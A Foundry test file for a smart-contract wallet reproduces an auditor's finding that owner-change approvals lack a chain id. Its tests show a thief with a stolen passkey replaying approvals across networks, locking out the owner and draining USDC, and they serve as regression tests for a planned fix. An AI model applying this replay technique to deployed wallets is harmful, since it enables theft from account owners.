// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {IPaymaster} from "account-abstraction/interfaces/IPaymaster.sol";
import {PackedUserOperation} from "account-abstraction/interfaces/PackedUserOperation.sol";
import {GatoPagoAccount} from "../../src/wallet/GatoPagoAccount.sol";
import {WalletFixture} from "./WalletFixture.sol";

/// @dev Pays for any operation: what anyone can deploy and fund on any network.
contract AnyonePaymaster is IPaymaster {
    function validatePaymasterUserOp(PackedUserOperation calldata, bytes32, uint256)
        external
        pure
        returns (bytes memory, uint256)
    {
        return ("", 0);
    }

    function postOp(PostOpMode, bytes calldata, uint256, uint256) external pure {}
}

/// KupiaSec's finding (email of 19-10-2026, medium), reproduced on the real EntryPoint v0.9 and the
/// compiled wallet: owner changes are signed without the chain id, apply in order on every network,
/// one passkey is enough, and the approval channel needs a paymaster but not ours. A thief with a
/// stolen passkey wins every network where the owner's removal of it has not landed yet.
///
/// These tests pass while the account is vulnerable. The fix (phase 11) must turn each of them
/// into the opposite assertion.
contract KeyRemovalRaceTest is WalletFixture {
    uint256 constant PHONE = 0xA11CE; // the owner's passkey
    uint256 constant LAPTOP = 0xB0B; // the stolen one
    uint256 constant ARBITRUM_SEPOLIA = 421614;
    uint256 constant AVALANCHE_FUJI = 43113;

    address thief = makeAddr("thief");
    AnyonePaymaster thiefPaymaster;

    function setUp() public {
        _deployWallet();
        thiefPaymaster = new AnyonePaymaster();
        ep.depositTo{value: 1 ether}(address(thiefPaymaster));
    }

    /// The owner removes the stolen laptop; where that removal is still pending, the thief sends
    /// its own change with the same sequence first, and the owner is out of the account there.
    function test_thiefWinsWhereTheRemovalIsPending() public {
        bytes[] memory phone = _owners(PHONE);
        address account = _deployed(PHONE);
        bytes memory addLaptop = abi.encodeCall(GatoPagoAccount.addOwners, (_owners(LAPTOP)));
        _send(_approvalOp(account, "", 0, addLaptop, _approval(account, PHONE, 0, addLaptop)));
        usdc.mint(account, 100e6);

        // The owner's approval #1 removes the laptop. It is already public on another network.
        bytes memory removeLaptop = abi.encodeCall(GatoPagoAccount.removeOwners, (_owners(LAPTOP)));
        bytes memory ownerRemoval = _approval(account, PHONE, 1, removeLaptop);

        // Here the thief signs its own #1 with the laptop and lands it first: its paymaster, its
        // transaction.
        bytes memory removePhone = abi.encodeCall(GatoPagoAccount.removeOwners, (phone));
        _thiefSends(_paidByThief(_approvalOp(account, "", 1, removePhone, _approval(account, LAPTOP, 1, removePhone))));
        assertFalse(GatoPagoAccount(payable(account)).isSigner(phone[0]));

        // The owner's removal comes too late: #1 is spent.
        PackedUserOperation memory late = _approvalOp(account, "", 1, removeLaptop, ownerRemoval);
        _expectFailedOp("AA24 signature error");
        _send(late);

        // The money on this network is the thief's.
        _drainedBy(account, 100e6);
    }

    /// On a network where the account never existed, the owner's approvals are public: the thief
    /// replays the one that added the laptop, then applies its own next one.
    function test_thiefTakesANetworkWhereTheAccountNeverExisted() public {
        uint256 freshNetwork = vm.snapshotState();
        vm.chainId(ARBITRUM_SEPOLIA);
        bytes[] memory phone = _owners(PHONE);
        address account = _deployed(PHONE);
        bytes memory addLaptop = abi.encodeCall(GatoPagoAccount.addOwners, (_owners(LAPTOP)));
        bytes memory removeLaptop = abi.encodeCall(GatoPagoAccount.removeOwners, (_owners(LAPTOP)));
        bytes memory added = _approval(account, PHONE, 0, addLaptop);
        bytes memory removed = _approval(account, PHONE, 1, removeLaptop);
        _send(_approvalOp(account, "", 0, addLaptop, added));
        _send(_approvalOp(account, "", 1, removeLaptop, removed));
        assertFalse(GatoPagoAccount(payable(account)).isSigner(_owners(LAPTOP)[0]));

        // Avalanche: nothing was ever deployed for this account, and someone pays it there.
        vm.revertToState(freshNetwork);
        vm.chainId(AVALANCHE_FUJI);
        assertEq(account.code.length, 0);
        usdc.mint(account, 50e6);

        _thiefSends(_paidByThief(_approvalOp(account, _initCode(phone), 0, addLaptop, added)));
        bytes memory removePhone = abi.encodeCall(GatoPagoAccount.removeOwners, (phone));
        _thiefSends(_paidByThief(_approvalOp(account, "", 1, removePhone, _approval(account, LAPTOP, 1, removePhone))));
        assertFalse(GatoPagoAccount(payable(account)).isSigner(phone[0]));

        PackedUserOperation memory late = _approvalOp(account, "", 1, removeLaptop, removed);
        _expectFailedOp("AA24 signature error");
        _send(late);
        _drainedBy(account, 50e6);
    }

    function _paidByThief(PackedUserOperation memory op) internal view returns (PackedUserOperation memory) {
        op.paymasterAndData = abi.encodePacked(address(thiefPaymaster), uint128(100_000), uint128(0));
        return op;
    }

    function _thiefSends(PackedUserOperation memory op) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = op;
        vm.prank(thief, thief);
        ep.handleOps(ops, payable(thief));
    }

    /// A normal payment signed by the laptop alone moves everything to the thief.
    function _drainedBy(address account, uint256 amount) internal {
        PackedUserOperation memory drain =
            _paidByThief(_op(account, "", _transfer(thief, amount), ep.getNonce(account, 0)));
        _thiefSends(_signed(drain, LAPTOP));
        assertEq(usdc.balanceOf(thief), amount);
        assertEq(usdc.balanceOf(account), 0);
    }
}
